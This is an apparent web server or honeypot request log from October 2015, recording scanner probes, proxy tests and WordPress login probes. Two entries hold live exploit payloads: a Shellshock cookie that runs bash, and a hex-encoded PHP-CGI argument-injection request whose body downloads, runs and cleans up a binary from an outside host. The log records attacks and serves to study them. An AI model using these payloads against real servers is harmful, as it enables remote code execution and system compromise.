2015-10-22 07:30:01,146.185.239.100:44643,http://24x7-allrequestsallowed.com/?PHPSESSID=tt2adea600143PWPJWTGYCMZJ%40%5B,GET http://24x7-allrequestsallowed.com/?PHPSESSID=tt2adea600143PWPJWTGYCMZJ%40%5B HTTP/1.1\
Accept: */*\
Host: 24x7-allrequestsallowed.com\
Proxy-Connection: Keep-Alive
2015-10-22 13:18:47,218.54.149.67:40099,/manager/html,GET /manager/html HTTP/1.1\
Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
Accept-Charset: ISO-8859-1\,utf-8;q=0.7\,*;q=0.7\
Accept-Encoding: gzip\, deflate\
Accept-Language: en-us\,en;q=0.5\
Connection: keep-alive\
Host: 153.126.192.79:80\
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
2015-10-22 13:29:27,162.252.240.124:33769,http://162.252.240.124:80/gw.php,GET http://162.252.240.124:80/gw.php HTTP/1.1\
Accept: */*\
Accept-Encoding: gzip\, deflate\
Connection: keep-alive\
Content-Length: 0\
Host: 162.252.240.124\
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML\, like Gecko) Chrome/44.0.2403.107 Safari/537.36
2015-10-22 14:33:10,82.118.237.104:55530,/,GET / HTTP/1.1\
Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
Accept-Encoding: deflate\, gzip\, identity\
Accept-Language: en-US;q=0.6\,en;q=0.4\
Host: 153.126.192.79\
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
2015-10-22 20:09:00,43.252.229.169:2348,/,GET / HTTP/1.1\
Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
Accept-Encoding: deflate\, gzip\, identity\
Accept-Language: en-US;q=0.6\,en;q=0.4\
Host: 153.126.192.79\
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
2015-10-23 19:08:01,185.49.14.190:38989,http://testp5.mielno.lubin.pl/testproxy.php,GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1\
Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
Accept-Encoding: gzip\, deflate\
Accept-Language: pl\,en-US;q=0.7\,en;q=0.3\
Host: testp5.mielno.lubin.pl\
Proxy-Connection: Keep-Alive\
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0
2015-10-23 20:23:32,193.169.86.58:58089,/,GET / HTTP/1.1\
Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
Accept-Encoding: deflate\, gzip\, identity\
Accept-Language: en-US;q=0.6\,en;q=0.4\
Host: 153.126.192.79\
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
2015-10-23 23:38:59,91.196.50.33:36605,http://testp3.pospr.waw.pl/testproxy.php,GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1\
Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
Accept-Encoding: gzip\, deflate\
Accept-Language: pl\,en-US;q=0.7\,en;q=0.3\
Host: testp3.pospr.waw.pl\
Proxy-Connection: Keep-Alive\
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0
2015-10-24 01:45:04,54.179.134.216:27288,/,GET / HTTP/1.0
2015-10-24 14:59:25,141.212.122.160:9606,/,GET / HTTP/1.1\
Host: 153.126.192.79\
User-Agent: Mozilla/5.0 zgrab/0.x
2015-10-24 22:31:13,169.45.161.187:21188,/,GET / HTTP/1.0\
Accept: */*\
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
2015-10-25 03:43:35,82.221.105.6:37982,/,GET / HTTP/1.1\
Accept-Encoding: identity\
Host: 153.126.192.79
2015-10-25 03:43:36,82.221.105.6:38034,/robots.txt,GET /robots.txt HTTP/1.1\
Accept-Encoding: identity\
Host: 153.126.192.79
2015-10-25 03:43:38,82.221.105.6:38109,/sitemap.xml,GET /sitemap.xml HTTP/1.1\
Accept-Encoding: identity\
Host: 153.126.192.79
2015-10-25 04:57:34,93.174.95.64:39463,//wp-login.php,GET //wp-login.php HTTP/1.1\
Connection: TE\, close\
Host: 153.126.192.79\
Te: deflate\,gzip;q=0.3\
User-Agent: Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15
2015-10-25 04:57:36,93.174.95.64:39570,/blog//wp-login.php,GET /blog//wp-login.php HTTP/1.1\
Connection: TE\, close\
Host: 153.126.192.79\
Te: deflate\,gzip;q=0.3\
User-Agent: Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15
2015-10-25 04:57:36,93.174.95.64:39671,/wordpress//wp-login.php,GET /wordpress//wp-login.php HTTP/1.1\
Connection: TE\, close\
Host: 153.126.192.79\
Te: deflate\,gzip;q=0.3\
User-Agent: Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15
2015-10-25 04:57:37,93.174.95.64:39737,/wp//wp-login.php,GET /wp//wp-login.php HTTP/1.1\
Connection: TE\, close\
Host: 153.126.192.79\
Te: deflate\,gzip;q=0.3\
User-Agent: Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15
2015-10-26 03:55:22,137.226.113.7:53714,/,GET / HTTP/1.1\
Connection: Keep-Alive\
Host: 153.126.192.79\
User-Agent: Scanning for research (researchscan.comsys.rwth-aachen.de)
2015-10-26 12:04:59,185.49.14.190:40309,http://testp3.pospr.waw.pl/testproxy.php,GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1\
Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
Accept-Encoding: gzip\, deflate\
Accept-Language: pl\,en-US;q=0.7\,en;q=0.3\
Host: testp3.pospr.waw.pl\
Proxy-Connection: Keep-Alive\
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0
2015-10-27 07:06:25,169.57.5.20:60000,/,GET / HTTP/1.0\
Accept: */*\
User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)
2015-10-27 15:26:48,185.93.185.47:43559,/rom-0,GET /rom-0 HTTP/1.1\
Connection: close\
Cookie: () { :;}; /bin/bash -c "ping 212.47.238.143 -c 1"\
Host: 153.126.192.79\
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
2015-10-27 22:15:08,54.158.43.215:36958,/,GET / HTTP/1.1\
Accept-Encoding: none\
Connection: close\
Host: 153.126.192.79\
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)
2015-10-27 23:10:32,203.67.9.75:60000,/,GET / HTTP/1.1\
Accept: */*\
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML\, like Gecko) Chrome/45.0.2454.101 Safari/537.36
2015-10-27 23:19:02,141.212.122.160:36706,/,GET / HTTP/1.1\
Host: 153.126.192.79\
User-Agent: Mozilla/5.0 zgrab/0.x
2015-10-28 01:10:10,94.102.48.194:49746,/,GET / HTTP/1.0\
Accept: */*\
User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)
2015-10-28 13:06:33,125.120.63.229:23966,/,GET / HTTP/1.0
2015-10-28 13:06:34,60.186.195.141:40057,/home.asp,GET /home.asp HTTP/1.1\
Accept: */*\
Connection: Keep-Alive\
Host: 153.126.192.79\
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; 360-cn-agent)
2015-10-28 13:06:34,60.186.108.24:13923,/,GET / HTTP/1.0
2015-10-28 13:06:34,122.235.190.60:3116,/,GET / HTTP/1.1\
Host: 153.126.192.79
2015-10-29 04:01:03,185.25.151.159:34614,http://testp5.mielno.lubin.pl/testproxy.php,GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1\
Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
Accept-Encoding: gzip\, deflate\
Accept-Language: pl\,en-US;q=0.7\,en;q=0.3\
Host: testp5.mielno.lubin.pl\
Proxy-Connection: Keep-Alive\
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0
2015-10-29 12:04:02,92.63.97.93:39408,/cgi-bin/php/cgin/php?%2D%64+%61%6C%75%6F%6E+%2D%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%74%5F%3D%30+%2D%64+%75%74+%2D%6E,POST /cgi-bin/php/cgin/php?%2D%64+%61%6C%75%6F%6E+%2D%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\
Content-Length: 1\
Content-Type: text/html\
Host: localhost\
\
a
2015-10-29 12:04:03,92.63.97.93:39412,//cgi-bin/php?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%64+%63%67%69%2e%66%6f%72%63%65%5f%72%65%64%69%72%65%63%74%3d%30+%2d%64+%63,POST //cgi-bin/php?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%64+%63%67%69%2e%66%6f%72%63%65%5f%72%65%64%69%72%65%63%74%3d%30+%2d%64+%63%67%69%2e%72%65%64%69%72%65%63%74%5f%73%74%61%74%75%73%5f%65%6e%76%3d%30+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e HTTP/1.1\
Content-Length: 188\
Content-Type: application/x-www-form-urlencoded\
Host: -h\
\
<? system("cd /tmp ; wget trying.us.to/seed.jpg ; curl -O http://trying.us.to/seed.jpg ; fetch http://trying.us.to/seed.jpg ; tar -xzvf seed.jpg ; chmod +x seed ; ./seed  ; rm -rf * "); ?>
2015-10-29 22:07:05,141.212.122.64:59145,/x,GET /x HTTP/1.1\
User-Agent: Telesphoreo
